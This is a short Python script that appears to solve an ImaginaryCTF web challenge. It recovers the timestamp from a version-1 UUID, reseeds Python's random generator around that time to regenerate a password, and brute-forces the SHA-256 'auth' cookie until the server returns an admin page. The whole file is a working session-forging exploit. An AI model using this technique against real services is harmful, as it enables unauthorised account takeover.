from time import sleep
import uuid
import random
import uuid
import requests
from hashlib import sha256


target = "5b251698-0596-11ed-b361-4e705681929a"

ts = round((uuid.UUID(target).time - 0x01b21dd213814000) * 100 / 1e9, 2)

for i in range(10 ** 9):
  for d in [i * 0.01, i * -0.01]:
    random.seed(round(ts + d, 2))
    password = "".join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(30)])
    cookie = sha256(password.encode()).hexdigest()
    res = requests.get("http://maas.chal.imaginaryctf.org/home", cookies={ "auth": cookie })
    if b"admin" in res.content:
      print(res.content)
      exit(0)
